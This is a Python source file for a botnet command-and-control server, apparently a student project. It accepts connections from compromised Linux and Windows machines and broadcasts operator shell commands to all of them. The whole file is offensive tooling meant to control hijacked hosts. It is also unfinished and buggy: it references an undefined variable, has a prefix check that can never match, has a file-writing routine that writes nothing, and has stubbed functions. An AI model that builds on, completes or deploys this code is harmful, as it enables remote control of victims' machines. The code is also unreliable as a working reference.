#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket # Import socket for creating TCP connection.
	from time import sleep # Import sleep from time to halt execution of program when necessary.
	from os import devnull, _exit # Import devnull from os to send stderr to devnull.
	from sys import exit # Import exit from sys to quit program when specified.
	from threading import Thread # Import Timer to create threads for our functions.
	from queue import Queue # Import Queue to use queue data structure functions.
	import readline # Import readline to allow arrow key history navigation.
except ImportError as err:
	print(f'Import error: {err}')
	exit(1)
	
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  CONSTANTS   #

PORT = 1337 # Port number to receve connection from.
IP = "172.17.0.1" # IP address of your computer. Change this!
NUM_OF_CONNECTIONS = 10 # Number of connections to accept.
NUM_OF_THREADS = 2 # Number of threads that we will create.
THREAD_IDS = [1, 2] # Thread identifiers.
BUFFER = 20000 # Maximum number of bytes to accept from the output of command.
COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
ENCODING = 'utf-8'

#   GLOBALS   #
WINDOWS_CONNS = {} # Dict containing Windows machines IP addresses and corresponding socket object.
LINUX_CONNS = {} # Dict containing Linux machines IP addresses and corresponding socket object.
WINDOWS_COUNT = 0 # Count for the number of Windows machines connected to our botnet.
LINUX_COUNT = 0 # Count for the number of Linux machines connected to our botnet.

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#  ANSICOLORS  #
RESET = "\033[0m"
BOLD = "\033[01m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class Server:
	"""Socket server"""
	def __init__(self):
		pass

	def create_socket(self):
		"""This function will create a single server socket will create a socket
			and bind it to an IP and network interface.
			Arguments:
				None
			Returns:
				None
		"""
		print("Creating sockets!")
		self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.server_socket.bind((IP, PORT))
		self.server_socket.listen(NUM_OF_CONNECTIONS)

	def accept_connections(self):
		"""
		"""
		global LINUX_CONNS
		global LINUX_COUNT
		global WINDOWS_CONNS
		global WINDOWS_COUNT

		LINUX_CONNS.clear()
		WINDOWS_CONNS.clear()

		while True:
			conn, addr = self.server_socket.accept()
			conn.setblocking(1)
			initial_response = conn.recv(COMMMAND_SIZE).decode('utf-8')
			if initial_response == 'Linux':
				LINUX_CONNS[addr[0]] = conn
				LINUX_COUNT += 1
			else:
				WINDOWS_CONNS[addr[0]] = conn
				WINDOWS_COUNT += 1

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class BotnetCmdCtrl:
	"""Botnett class definition"""
	def __init__(self):
		self.server = Server() # Will instantiate and store a Server object.
		self.server_queue = Queue() # Will be used to perform next job in the queue.
		self.output_to_file = False # Will switch mode from only stdout to stdout and file stream.
		global LINUX_COUNT
		global LINUX_CONNS
		global WINDOWS_COUNT
		global WINDOWS_COUNT

	def create_threads(self):
		"""This function will create two seperate threads.
		One will be used to accept incoming connections, and
		the other will be used to performing I/O between all
		of our connections.
			Arguments:
				None:
			Returns:
				None
		"""
		for _ in range(NUM_OF_THREADS):
			t = Thread(target=self.command_and_control) # Create thread
			t.daemon = True # Run in the background.
			t.start() # Start the thread

	def create_jobs(self):
		"""This function will create jobs and store them in a queue.
		The jobs will be executed by seperate threads.
			Arguments:
				None
			Returns:
				None
		"""
		for x in THREAD_IDS:
			self.server_queue.put(x) # Add element to the queue.
		self.server_queue.join() # Block main thread until worker threads have processes everything in queue.

	def get_command(self):
		"""This function gets a command from the user.
			Arguments:
				None
			Returns:
				The command that was provided by the user.
		"""
		cmd = input(GREEN + "cmd $: " + RESET)
		while cmd != 'quit':
			if cmd == 'list linux': 
				for index, ipaddr in enumerate(LINUX_CONNS.keys()):
					print(index, ipaddr)

			elif cmd == 'list windows': 
				for index, ipaddr in enumerate(WINDOWS_CONNS.keys()):
					print(index, ipaddr)

			elif cmd == 'count linux':
				print(f'{LINUX_COUNT} Linux targets.')

			elif cmd == 'count windows':
				print(f'{WINDOWS_COUNT} Windows targets.')

			elif cmd[:5] == 'linux':
				resp_list = self.send_cmd_all_linux(cmd[5:])
				i = 0
				for output in resp_list:
					if i % 2 == 0 and not self.output_to_file:
						print(RED, output, RESET)
					elif i % 2 == 0 and self.output_to_file:
						print(RED, output, RESET)
						self.write_response_output(output)

			elif cmd == 'switch':
				self.output_to_file = True

			elif cmd[:5] == 'windows':
				resp_list = self.send_cmd_all_windows(cmd[5:])
				self.write_response_output(resp_list)

			elif cmd[:6] == 'select':
				resp_list = self.send_cmd_specific(cmd[6:])
				self.write_response_output(resp_list)

			elif cmd == 'help':
				self.help()

			else:
				print("Invalid command, type 'help' for help menu...")

			cmd = input(GREEN + "cmd $: " + RESET)
	
	def send_cmd_all_linux(self, cmd: str):
		"""This function will send the command to all linux bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
			Returns:
				Will return the response generated by the executed command on the client machines operating on linux.
		"""
		response_list = []
		for ip, conn in LINUX_CONNS.items():
			conn.send(cmd.encode(ENCODING))
			response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
			response = response[2:-1]
			response = output.replace('\\n', '\n')
			response_list.extend([ip, response])
		return response_list
			
	def send_cmd_all_windows(self, cmd: str):
		"""This function sends a command to all windows bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
		 	Returns:
				None
		"""
		response_list = []
		for conn in WINDOWS_CONNS.values():
			conn.sendall(cmd.encode(ENCODING))
			response = conn.recv(BUFFER).decode(ENCODING)
			response_list.append(response)
		return response_list
	
	def send_cmd_specific(self, cmd: str):
		"""This function will send a command to specific IP addresses.
			Arguments:
				cmd (str): Command to send to target/s.
			Returns:
				None
		"""
		pass

	def write_response_output(self, response: str, ip_addr: str):
		"""This function will write the response generated by each machine in the botnet 
		to a folder called "bots". The bots folder will contain files called by
		the IP addresses of each compromised machines.
		 	Arguments:
				response (str): The executed command response.
				ip_addr (str): The IP addresses of the current machine we are communicating with.
			Returns:
				None
		"""
		with open("bots/" + ip_addr, 'a+') as botfile:
			pass
			
	def command_and_control(self):
		"""This function is running the operations for each (2) thread we create
		in the create_threads function.
			Arguments:
				None
			Returns:
				None
		"""
		while True:
			x = self.server_queue.get()
			if x == 1:
				self.server.create_socket()
				self.server.accept_connections()
			if x == 2:
				self.get_command()
			self.server_queue.task_done()
				
	def help(self):
		"""This function will print a help menu.
			Arguments:
				None
			Returns:
				None
		"""
		print("""
Commands:
list linux -> Lists all the Linux connections (IPs) 
list windows -> Lists all the Windows connections (IPs)
count linux -> Lists the amount of Linux connections (int)
count windows -> Lists the amount of Windows connections (int)
linux ->  Any command following this string will be sent to all of the Linux machines under control 
windows -> Any command following this string will be sent to all of the Windows machines under control
select -> Any command following this string + the target IP will be sent to a specific machine under control
switch -> Entering this string will write the responses that targets send back to a file as well as display it in the terminal
		""")

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	botnetObj = BotnetCmdCtrl() # Instantiating socket object.
	botnetObj.create_threads()
	botnetObj.create_jobs()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
		try:
			print(RED, "Exiting server...", RESET)
			exit(1)
		except SystemExit: # Handling SystemExit error.
			_exit(1)

